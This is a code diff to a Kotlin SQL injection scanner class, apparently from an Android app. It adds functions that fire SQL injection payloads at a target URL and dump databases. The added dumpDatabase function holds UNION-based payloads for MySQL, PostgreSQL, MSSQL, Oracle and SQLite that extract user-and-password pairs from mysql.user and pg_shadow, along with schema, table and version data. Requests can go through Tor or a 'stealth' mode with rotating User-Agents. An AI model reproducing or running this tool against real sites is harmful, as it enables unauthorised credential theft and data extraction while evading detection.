@@ -72,6 +72,7 @@ class SQLScanner {
         var successfulPayload = ""
         var responseDetails = ""
         val extractedData = mutableListOf<String>()
+        val vulnerablePayloads = mutableListOf<VulnerablePayload>()
         var testedPayloads = 0
         var errorCount = 0
         val errorMessages = mutableListOf<String>()
@@ -102,12 +103,22 @@ class SQLScanner {
                 
                 // Check for SQL errors in response
                 if (containsSQLError(body)) {
-                    vulnerabilityFound = true
-                    detectedDatabase = detectDatabaseType(body)
-                    successfulPayload = payload
-                    responseDetails = "Status: $statusCode\n\n${body.take(500)}"
-                    Log.i(TAG, "VULNERABILITY FOUND! Payload: $payload, DB Type: $detectedDatabase")
-                    break
+                    val description = SQLPayloads.getPayloadDescription(payload)
+                    vulnerablePayloads.add(
+                        VulnerablePayload(
+                            payload = payload,
+                            description = description,
+                            response = "Status: $statusCode\n\n${body.take(1000)}"
+                        )
+                    )
+                    
+                    if (!vulnerabilityFound) {
+                        vulnerabilityFound = true
+                        detectedDatabase = detectDatabaseType(body)
+                        successfulPayload = payload
+                        responseDetails = "Status: $statusCode\n\n${body.take(500)}"
+                        Log.i(TAG, "VULNERABILITY FOUND! Payload: $payload, DB Type: $detectedDatabase")
+                    }
                 }
             } catch (e: UnknownHostException) {
                 errorCount++
@@ -201,7 +212,8 @@ class SQLScanner {
             databaseType = detectedDatabase,
             extractedData = extractedData,
             payloadUsed = successfulPayload,
-            responseDetails = responseDetails
+            responseDetails = responseDetails,
+            vulnerablePayloads = vulnerablePayloads
         )
     }
     
@@ -404,5 +416,129 @@ class SQLScanner {
         }
         
         return extracted.distinct().take(MAX_EXTRACTED_ITEMS)
+    }
+    
+    /**
+     * Execute a specific SQL injection payload and return the response
+     */
+    suspend fun executePayload(url: String, payload: String, mode: ScanMode): String = withContext(Dispatchers.IO) {
+        Log.d(TAG, "Executing payload: ${payload.take(50)}... on URL: $url")
+        
+        val client = when (mode) {
+            ScanMode.STANDARD -> standardClient
+            ScanMode.TOR -> torClient
+            ScanMode.STEALTH -> createStealthClient()
+        }
+        
+        val testUrl = buildTestUrl(url, payload)
+        val request = Request.Builder()
+            .url(testUrl)
+            .apply {
+                if (mode == ScanMode.STEALTH) {
+                    header("User-Agent", stealthUserAgents.random())
+                }
+            }
+            .build()
+        
+        val response = client.newCall(request).execute()
+        val statusCode = response.code
+        val body = response.body?.string() ?: ""
+        response.close()
+        
+        Log.i(TAG, "Payload execution complete. Status: $statusCode, Response length: ${body.length}")
+        
+        return@withContext "HTTP Status: $statusCode\n\n" +
+            "Full Response:\n" +
+            "=" .repeat(50) + "\n" +
+            body
+    }
+    
+    /**
+     * Attempt to dump database contents using various SQL injection techniques
+     */
+    suspend fun dumpDatabase(url: String, dbType: DatabaseType, mode: ScanMode): Map<String, List<String>> = withContext(Dispatchers.IO) {
+        Log.d(TAG, "Starting database dump for URL: $url, DB Type: $dbType")
+        
+        val client = when (mode) {
+            ScanMode.STANDARD -> standardClient
+            ScanMode.TOR -> torClient
+            ScanMode.STEALTH -> createStealthClient()
+        }
+        
+        val dumpedData = mutableMapOf<String, List<String>>()
+        
+        // Database-specific dump payloads
+        val dumpPayloads = when (dbType) {
+            DatabaseType.MYSQL -> listOf(
+                "' UNION SELECT NULL,CONCAT(user,':',password),NULL FROM mysql.user-- " to "MySQL Users & Passwords",
+                "' UNION SELECT NULL,schema_name,NULL FROM information_schema.schemata-- " to "Database Names",
+                "' UNION SELECT NULL,table_name,NULL FROM information_schema.tables-- " to "Table Names",
+                "' UNION SELECT NULL,CONCAT(table_name,':',column_name),NULL FROM information_schema.columns-- " to "Columns",
+                "' UNION SELECT NULL,@@version,NULL-- " to "Database Version",
+                "' UNION SELECT NULL,database(),NULL-- " to "Current Database"
+            )
+            DatabaseType.POSTGRESQL -> listOf(
+                "' UNION SELECT NULL,usename||':'||passwd,NULL FROM pg_shadow-- " to "PostgreSQL Users",
+                "' UNION SELECT NULL,datname,NULL FROM pg_database-- " to "Database Names",
+                "' UNION SELECT NULL,tablename,NULL FROM pg_tables-- " to "Table Names",
+                "' UNION SELECT NULL,version(),NULL-- " to "Database Version"
+            )
+            DatabaseType.MSSQL -> listOf(
+                "' UNION SELECT NULL,name,NULL FROM sys.databases-- " to "Database Names",
+                "' UNION SELECT NULL,name,NULL FROM sys.tables-- " to "Table Names",
+                "' UNION SELECT NULL,@@version,NULL-- " to "Database Version",
+                "' UNION SELECT NULL,SYSTEM_USER,NULL-- " to "System User"
+            )
+            DatabaseType.ORACLE -> listOf(
+                "' UNION SELECT NULL,username,NULL FROM all_users-- " to "Oracle Users",
+                "' UNION SELECT NULL,table_name,NULL FROM all_tables-- " to "Table Names",
+                "' UNION SELECT NULL,banner,NULL FROM v$version-- " to "Database Version"
+            )
+            else -> listOf(
+                "' UNION SELECT NULL,sql,NULL FROM sqlite_master WHERE type='table'-- " to "SQLite Schema"
+            )
+        }
+        
+        for ((payload, category) in dumpPayloads) {
+            try {
+                val testUrl = buildTestUrl(url, payload)
+                val request = Request.Builder()
+                    .url(testUrl)
+                    .apply {
+                        if (mode == ScanMode.STEALTH) {
+                            header("User-Agent", stealthUserAgents.random())
+                        }
+                    }
+                    .build()
+                
+                val response = client.newCall(request).execute()
+                val body = response.body?.string() ?: ""
+                response.close()
+                
+                // Extract data from response
+                val extracted = extractDataFromResponse(body)
+                if (extracted.isNotEmpty()) {
+                    dumpedData[category] = extracted
+                    Log.i(TAG, "Dumped $category: ${extracted.size} items")
+                } else {
+                    // Try to parse raw response for data
+                    val lines = body.lines()
+                        .filter { it.isNotBlank() && it.length < 200 }
+                        .take(20)
+                    if (lines.isNotEmpty()) {
+                        dumpedData[category] = lines
+                    }
+                }
+            } catch (e: Exception) {
+                Log.w(TAG, "Error dumping $category: ${e.message}")
+            }
+        }
+        
+        if (dumpedData.isEmpty()) {
+            dumpedData["Error"] = listOf("No data could be extracted. The target may not be vulnerable or uses protections.")
+        }
+        
+        Log.d(TAG, "Database dump complete. Categories dumped: ${dumpedData.keys.size}")
+        return@withContext dumpedData
     }
 }
